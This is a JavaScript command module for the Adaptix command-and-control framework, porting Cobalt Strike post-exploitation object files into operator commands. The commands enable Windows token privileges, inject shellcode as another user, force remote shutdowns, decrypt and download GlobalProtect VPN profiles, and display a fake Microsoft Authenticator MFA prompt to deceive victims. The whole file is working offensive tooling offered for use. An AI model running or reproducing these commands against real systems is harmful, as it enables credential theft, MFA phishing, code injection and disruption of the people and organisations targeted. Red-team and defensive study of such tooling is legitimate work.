var metadata = {
    name: "CS-Misc-BOF",
    description: "Ported Cobalt Strike CS-Remote-OPs miscellaneous BOFs (prefix: cs_)"
};

/// COMMANDS
//
// Original CS -> Adaptix
//   get_priv         -> cs_get_priv         [PRIV_NAME]                              pack "z"     -> cstr
//   shspawnas        -> cs_shspawnas        [DOMAIN] [USERNAME] [PASSWORD] [SCFILE]  pack "ZZZb"  -> wstr,wstr,wstr,bytes
//   shutdown         -> cs_shutdown         [HOSTNAME] [MESSAGE] [TIME] [CLOSEAPPS] [REBOOT]   pack "zziss"  -> cstr,cstr,int,short,short
//   global_unprotect -> cs_global_unprotect                                                  no args
//   ask_mfa          -> cs_ask_mfa          [MFA_NUMBER 0..99]                              pack "i"     -> int


// ---------- cs_get_priv ----------
var cmd_get_priv = ax.create_command(
    "cs_get_priv",
    "Enable a token privilege by name (see Microsoft privilege-constants for valid names, e.g. SeDebugPrivilege)",
    "cs_get_priv SeDebugPrivilege"
);
cmd_get_priv.addArgString("privilege", true, "Privilege constant name (e.g. SeDebugPrivilege)");
cmd_get_priv.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let priv = parsed_json["privilege"];
    let bof_params = ax.bof_pack("cstr", [priv]);
    let bof_path = ax.script_dir() + "_bin/get_priv." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `execute bof "${bof_path}" ${bof_params}`, "Task: cs_get_priv " + priv);
});


// ---------- cs_shspawnas ----------
var cmd_shspawnas = ax.create_command(
    "cs_shspawnas",
    "Spawn/inject shellcode as a specified user (interactive logon - shows up as such in logs). Use \"\" for DOMAIN to log into the local machine. Fails if run as SYSTEM.",
    'cs_shspawnas "" backdoor "P@ssw0rd!" /tmp/shellcode.bin'
);
cmd_shspawnas.addArgString("domain",    true, 'Domain name, or "" for local machine');
cmd_shspawnas.addArgString("username",  true, "Username");
cmd_shspawnas.addArgString("password",  true, "Password");
cmd_shspawnas.addArgFile  ("shellcode", true, "Local path to raw shellcode file");
cmd_shspawnas.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let domain   = parsed_json["domain"];
    let username = parsed_json["username"];
    let password = parsed_json["password"];
    let sc_b64   = parsed_json["shellcode"]; // base64

    if (!sc_b64 || sc_b64.length === 0) {
        ax.console_message(id, "cs_shspawnas: could not read shellcode file\n", "error");
        return;
    }

    let bof_params = ax.bof_pack("wstr,wstr,wstr,bytes", [domain, username, password, sc_b64]);
    let bof_path = ax.script_dir() + "_bin/shspawnas." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `execute bof "${bof_path}" ${bof_params}`, "Task: cs_shspawnas " + domain + "\\" + username);
});


// ---------- cs_shutdown ----------
var cmd_shutdown = ax.create_command(
    "cs_shutdown",
    "Shut down or reboot a local/remote system. Non-zero TIME will prompt the user with MESSAGE. Remote requires admin.",
    'cs_shutdown "" "planned patch" 0 1 1'
);
cmd_shutdown.addArgString("hostname",  true, 'Target hostname, or "" for local');
cmd_shutdown.addArgString("message",   true, 'Notification message, or "" for none');
cmd_shutdown.addArgInt   ("time",      true, "Seconds before shutdown/reboot (0 = immediate)");
cmd_shutdown.addArgInt   ("closeapps", true, "0 = let user save; 1 = force close apps with unsaved changes");
cmd_shutdown.addArgInt   ("reboot",    true, "0 = power off, 1 = reboot after shutdown");
cmd_shutdown.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let hostname  = parsed_json["hostname"];
    let message   = parsed_json["message"];
    let time_v    = parseInt(parsed_json["time"]);
    let closeapps = parseInt(parsed_json["closeapps"]);
    let reboot    = parseInt(parsed_json["reboot"]);

    if (isNaN(time_v) || time_v < 0) {
        ax.console_message(id, "cs_shutdown: time must be >= 0\n", "error"); return;
    }
    if (closeapps !== 0 && closeapps !== 1) {
        ax.console_message(id, "cs_shutdown: closeapps must be 0 or 1\n", "error"); return;
    }
    if (reboot !== 0 && reboot !== 1) {
        ax.console_message(id, "cs_shutdown: reboot must be 0 or 1\n", "error"); return;
    }

    let bof_params = ax.bof_pack("cstr,cstr,int,short,short", [hostname, message, time_v, closeapps, reboot]);
    let bof_path = ax.script_dir() + "_bin/shutdown." + ax.arch(id) + ".o";

    let action = (reboot === 1) ? "reboot" : "shutdown";
    let where  = (hostname && hostname.length) ? hostname : "localhost";
    ax.execute_alias(id, cmdline, `execute bof "${bof_path}" ${bof_params}`,
        "Task: cs_shutdown - " + action + " " + where + " in " + time_v + "s");
});


// ---------- cs_global_unprotect ----------
var cmd_global_unprotect = ax.create_command(
    "cs_global_unprotect",
    "Find, decrypt, and download GlobalProtect VPN profiles and HIP settings",
    "cs_global_unprotect"
);
cmd_global_unprotect.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let bof_path = ax.script_dir() + "_bin/global_unprotect." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `execute bof "${bof_path}"`, "Task: cs_global_unprotect");
});


// ---------- cs_ask_mfa ----------
var cmd_ask_mfa = ax.create_command(
    "cs_ask_mfa",
    "Display a fake Microsoft Authenticator MFA prompt showing NUMBER (0-99). Auto-closes after 30s.",
    "cs_ask_mfa 42"
);
cmd_ask_mfa.addArgInt("number", true, "MFA challenge number (0-99)");
cmd_ask_mfa.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let n = parseInt(parsed_json["number"]);
    if (isNaN(n) || n < 0 || n > 99) {
        ax.console_message(id, "cs_ask_mfa: number must be 0..99\n", "error");
        return;
    }
    let bof_params = ax.bof_pack("int", [n]);
    let bof_path = ax.script_dir() + "_bin/ask_mfa." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `execute bof "${bof_path}" ${bof_params}`, "Task: cs_ask_mfa " + n);
});


/// REGISTER GROUP

var group_cs_misc = ax.create_commands_group("CS-Misc-BOF", [
    cmd_get_priv,
    cmd_shspawnas,
    cmd_shutdown,
    cmd_global_unprotect,
    cmd_ask_mfa
]);
ax.register_commands_group(group_cs_misc, ["beacon", "gopher", "kharon"], ["windows"], []);
